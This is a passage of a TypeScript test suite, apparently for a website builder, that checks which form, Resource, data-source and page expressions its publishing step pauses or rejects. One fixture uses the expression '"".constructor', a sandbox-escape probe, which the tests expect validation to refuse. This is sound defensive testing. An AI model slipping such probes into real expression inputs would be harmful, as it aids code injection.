        instanceId: "box",
        propId: "box:data-state",
        name: "data-state",
      },
    ]);
  });

  // An expression names only data sources the published module declares
  // where it is written
  describe("where the published modules declare a name", () => {
    const formData = encodeDataSourceVariable("form-data");
    const browserInfo = encodeDataSourceVariable("browser-info");
    const formSources: DataSource[] = [
      {
        type: "parameter",
        id: "form-data",
        name: "formData",
        scopeInstanceId: "form",
      },
      {
        type: "parameter",
        id: "browser-info",
        name: "browserInfo",
        scopeInstanceId: "form",
      },
      {
        type: "resource",
        id: "hook-ds",
        name: "hook",
        scopeInstanceId: "form",
        resourceId: "hook",
      },
    ];
    // a Resource Form inside the body, whose destination is the hook
    const findForm = ({
      page = pageOf(),
      props = [],
      hook = {},
      formChildren = idsOf("field"),
      outside = "Box",
    }: {
      page?: Page;
      props?: Prop[];
      hook?: Partial<Resource>;
      formChildren?: Instance["children"];
      outside?: string;
    } = {}) =>
      findPausedExpressions({
        pages: [page],
        instances: toMap([
          instance("body", "Body", idsOf("outside", "form")),
          instance("outside", outside),
          instance("form", "ResourceForm", formChildren),
          instance("field", "Box"),
        ]),
        props: [
          {
            id: "form:action",
            instanceId: "form",
            name: "action",
            type: "json",
            value: [{ dataSourceId: "hook-ds" }],
          },
          parameterProp("form", "formData", "form-data"),
          parameterProp("form", "browserInfo", "browser-info"),
          ...props,
        ],
        dataSources: toMap(formSources),
        resources: toMap([
          resource({
            id: "hook",
            name: "hook",
            method: "post",
            url: '"https://example.org/hook"',
            body: `({ email: ${formData}.email, agent: ${browserInfo}.userAgent })`,
            ...hook,
          }),
        ]),
      });

    test("keeps a Resource Form's form data and browser info, its props and its destination, where the page publishes the form", () => {
      expect(
        findForm({
          props: [
            bound("field", "title", `${formData}.email`),
            // a page that publishes the form may name them anywhere
            bound("outside", "title", `${browserInfo}.userAgent`),
          ],
        })
      ).toEqual([]);
    });

    test("reads a form's destination the page loads for nothing else as the form's submission, and one it does as the page's", () => {
      const published: PublishedPage[] = [];
      findPausedExpressions({
        pages: [pageOf()],
        instances: toMap([
          instance("body", "Body", idsOf("form", "box")),
          instance("form", "ResourceForm"),
          instance("box", "Box"),
        ]),
        props: [
          {
            id: "form:action",
            instanceId: "form",
            name: "action",
            type: "json",
            value: [{ dataSourceId: "sent-ds" }, { dataSourceId: "read-ds" }],
          },
          // the page reads one of them elsewhere
          bound("box", "title", `${encodeDataSourceVariable("read-ds")}.x`),
        ],
        dataSources: toMap(
          ["sent", "read"].map(
            (id): DataSource => ({
              type: "resource",
              id: `${id}-ds`,
              name: id,
              scopeInstanceId: "form",
              resourceId: id,
            })
          )
        ),
        resources: toMap([
          resource({ id: "sent", method: "post" }),
          resource({ id: "read", method: "post" }),
        ]),
        observe: (page) => published.push(page),
      });
      expect(published.map(({ submission }) => [...submission])).toEqual([
        ["sent"],
      ]);
      expect(published.map(({ inGraph }) => [...inGraph])).toEqual([["read"]]);
    });

    test("pauses a name of a Resource Form's form data on an XML page, which publishes no form", () => {
      expect(
        findForm({
          page: pageOf({ meta: { documentType: "xml" } }),
          // an XML element, which an XML page writes
          outside: "XmlNode",
          props: [bound("outside", "title", `${formData}.email`)],
        })
      ).toEqual([
        // a destination the page also loads may not name the form's data
        { kind: "resource", resourceId: "hook" },
        {
          kind: "prop",
          instanceId: "outside",
          propId: "outside:title",
          name: "title",
        },
        {
          kind: "prop",
          instanceId: "form",
          propId: "form:formData",
          name: "formData",
        },
        {
          kind: "prop",
          instanceId: "form",
          propId: "form:browserInfo",
          name: "browserInfo",
        },
      ]);
    });

    test("pauses a Resource Form's destination that names what its module does not declare", () => {
      const dataSources = [...formSources, ...dataSourceList];
      const paused = findPausedExpressions({
        pages: [pageOf()],
        instances: toMap([
          instance("body", "Body", idsOf("form", "list")),
          instance("form", "ResourceForm"),
          instance("list", collectionComponent),
        ]),
        props: [
          {
            id: "form:action",
            instanceId: "form",
            name: "action",
            type: "json",
            value: [{ dataSourceId: "hook-ds" }],
          },
          bound("list", "data", "[1]"),
          parameterProp("list", "item", "param-1"),
        ],
        dataSources: toMap(dataSources),
        resources: toMap([
          resource(),
          resource({
            id: "hook",
            name: "hook",
            method: "post",
            body: `({ email: ${formData}.email, item: ${param} })`,
          }),
        ]),
      });
      expect(paused).toEqual([{ kind: "resource", resourceId: "hook" }]);
    });

    test("keeps a Resource that names another Resource's data its module declares, and pauses one that names data it does not", () => {
      const next = encodeDataSourceVariable("next-ds");
      const build = (url: string) =>
        findPausedExpressions({
          pages: [pageOf()],
          instances: toMap([
            instance("body", "Body", idsOf("list")),
            instance("list", collectionComponent),
          ]),
          props: [bound("list", "data", "[1]")],
          dataSources: toMap([
            ...dataSourceList,
            {
              type: "resource",
              id: "next-ds",
              name: "next",
              scopeInstanceId: "body",
              resourceId: "next",
            },
          ]),
          resources: toMap([
            resource({ url }),
            resource({ id: "next", name: "Next" }),
          ]),
        });
      expect(build(`"https://example.org/" + ${next}.data.cursor`)).toEqual([]);
      // a Resource may not name a Collection's item
      expect(build(`"https://example.org/" + ${param}`)).toEqual([
        { kind: "resource", resourceId: "res-1" },
      ]);
    });

    test("pauses a Resource that reads the data of a Resource that goes, and what reads that one", () => {
      const resourceSource = (id: string): DataSource => ({
        type: "resource",
        id: `${id}-ds`,
        name: id,
        scopeInstanceId: "body",
        resourceId: id,
      });
      const reads = (id: string) =>
        `"https://example.org/" + ${encodeDataSourceVariable(`${id}-ds`)}.next`;
      expect(
        findPausedExpressions({
          pages: [pageOf()],
          instances: toMap([instance("body", "Body")]),
          props: [],
          dataSources: toMap(["first", "second", "third"].map(resourceSource)),
          resources: toMap([
            // the Resources are read in order, so a later one goes first
            resource({ id: "first", url: reads("second") }),
            resource({ id: "second", url: reads("third") }),
            resource({
              id: "third",
              url: '"https://example.org/" + (0 < 1 > 2)',
            }),
          ]),
        })
      ).toEqual([
        { kind: "resource", resourceId: "third" },
        { kind: "resource", resourceId: "second" },
        { kind: "resource", resourceId: "first" },
      ]);
    });

    test("pauses a Resource whose every email field input validation passes but the pause refuses", () => {
      for (const field of [
        "subject",
        "body",
        "senderExpression",
        "recipientsExpression",
      ]) {
        expect(
          find({
            resources: [
              resource({
                control: "email",
                email: { [field]: '"a" + (0 < 1 > 2)' },
              }),
            ],
          }),
          field
        ).toEqual([{ kind: "resource", resourceId: "res-1" }]);
      }
      expect(
        find({
          resources: [
            resource({
              control: "email",
              email: { subject: `"New: " + ${variable}` },
            }),
          ],
        })
      ).toEqual([]);
    });

    test("pauses a data source or a Resource named like a module's own name or a global it reads", () => {
      for (const name of [
        "String",
        "Error",
        "_data",
        "_action",
        "_contentData",
        "_contentDocuments",
        "documents",
      ]) {
        expect(
          find({
            dataSources: [
              ...dataSourceList,
              {
                type: "variable",
                id: "named",
                name,
                scopeInstanceId: "body",
                value: { type: "string", value: "" },
              },
            ],
          }),
          name
        ).toEqual([{ kind: "dataSource", dataSourceId: "named" }]);
        expect(find({ resources: [resource({ name })] }), name).toEqual([
          { kind: "resource", resourceId: "res-1" },
        ]);
      }
    });

    test("reads a statically hidden subtree as unpublished, and lets a page name what only it holds", () => {
      const hiddenSource = encodeDataSourceVariable("hidden-ds");
      const paused = findPausedExpressions({
        pages: [pageOf()],
        instances: toMap([
          instance("body", "Body", idsOf("box", "hidden")),
          instance("box", "Box"),
          instance("hidden", "Box", idsOf("deep")),
          instance("deep", "Box"),
        ]),
        props: [
          {
            ...bound("hidden", "data-ws-show", "false"),
            type: "boolean",
            value: false,
          } as Prop,
          // the pause refuses it, input validation passes it: unpublished
          bound("deep", "title", "0 < 1 > 2"),
          // input validation refuses it
          bound("deep", "data-x", '"".constructor'),
          // a data source only the hidden subtree holds may be named elsewhere
          bound("box", "title", `${hiddenSource}.x`),
        ],
        dataSources: toMap([
          {
            type: "parameter",
            id: "hidden-ds",
            name: "hidden",
            scopeInstanceId: "deep",
          },
        ]),
        resources: new Map(),
      });
      expect(paused).toEqual([
        {
          kind: "prop",
          instanceId: "deep",
          propId: "deep:data-x",
          name: "data-x",
          unpublished: true,
        },
      ]);
    });

    test("reads a page setting published as text by input validation alone", () => {
      expect(
        find({
          pages: [
            pageOf({
              title: "Hello",
              meta: { description: "Welcome", language: "en" },
            }),
          ],
        })
      ).toEqual([]);
      expect(
        find({
          pages: [
            pageOf({
              title: "Hello2",
              meta: { description: "Hello World" },
            }),
          ],
        })
      ).toEqual([
        { kind: "page", pageId: "home", field: "title" },
        { kind: "page", pageId: "home", field: "description" },
      ]);
      // one published as code is held to the pause's rule
      expect(find({ pages: [pageOf({ title: '"a" + (0 < 1 > 2)' })] })).toEqual(
        [{ kind: "page", pageId: "home", field: "title" }]
      );
    });

    test("reads a prop a page never publishes as unpublished", () => {
      const paused = findPausedExpressions({
        pages: [pageOf()],
        instances: toMap([
          instance("body", "Body", idsOf("block", "list")),
          instance("block", blockComponent, idsOf("body-of-block")),
          instance("body-of-block", blockBodyComponent),
          instance("list", collectionComponent),
        ]),
        props: [
          bound("block", "title", "0 < 1 > 2"),
          bound("body-of-block", "title", "0 < 1 > 2"),
          bound("list", "title", "0 < 1 > 2"),
          bound("list", "data", "[1]"),
          // these a page publishes
          bound("block", "data-ws-show", "0 < 1 > 2"),
          bound("list", "data-ws-show", "0 < 1 > 2"),
        ],
        dataSources: new Map(),
        resources: new Map(),
      });
      expect(paused).toEqual([
        {
          kind: "prop",
          instanceId: "block",
          propId: "block:data-ws-show",
          name: "data-ws-show",
        },
        {
          kind: "prop",
          instanceId: "list",
          propId: "list:data-ws-show",
          name: "data-ws-show",
        },
      ]);
    });

    test("lets every module name the system data, whatever the build stores under its id", () => {
      expect(
        findPausedExpressions({
          pages: [pageOf({ title: "$ws$system.params.slug" })],
          instances: toMap([
            instance("body", "Body", idsOf("box")),
            instance("box", "Box"),
          ]),
          props: [bound("box", "title", "$ws$system.search.q")],
          dataSources: toMap(dataSourceList),
          resources: toMap([
            resource({
              url: '"https://example.org/" + $ws$system.params.slug',
            }),
          ]),
          // a data source stored under the system data's id goes for its id
          dropped: new Set([SYSTEM_VARIABLE_ID]),
        })
      ).toEqual([]);
    });

    test("pauses a Collection's data that names its own item key", () => {
      expect(
        find({ props: [bound("list", "data", `[${key}]`)] }).filter(
          (item) => item.kind === "prop"
        )
      ).toEqual([
        { kind: "prop", instanceId: "list", propId: "list:data", name: "data" },
      ]);
    });
  });
});
